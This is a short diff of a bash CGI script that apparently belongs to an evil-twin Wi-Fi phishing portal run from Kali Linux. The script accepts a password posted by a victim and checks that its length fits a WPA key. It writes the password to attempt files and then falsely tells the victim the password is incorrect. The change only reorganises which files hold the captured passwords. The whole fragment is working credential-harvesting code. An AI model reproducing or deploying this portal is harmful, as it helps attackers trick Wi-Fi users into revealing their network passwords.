@@ -21,13 +21,8 @@ if [[ "${REQUEST_METHOD}" = "POST" ]] && [[ ${CONTENT_LENGTH} -gt 0 ]]; then
 fi
 
 if [[ ${#password} -ge 8 ]] && [[ ${#password} -le 63 ]]; then
-    rm -rf "/tmp/www/ag.et_currentpass.txt" > /dev/null 2>&1
-    echo "${REQUEST_METHOD}" >\
-    "/home/kali/Desktop/SimpleWifi/SimpleWifiy/www/ag.post_info.txt"
+    rm -rf "/tmp/www/ag.et_attempts.txt" > /dev/null 2>&1
     echo "${password}" >\
-    "/home/kali/Desktop/SimpleWifi/SimpleWifiy/www/ag.et_currentpass.txt"
-
-    echo "${password}" >>\
     "/home/kali/Desktop/SimpleWifi/SimpleWifiy/www/ag.et_attempts.txt"
     echo 'The password is incorrect, redirecting to the main screen'
     et_successful=0
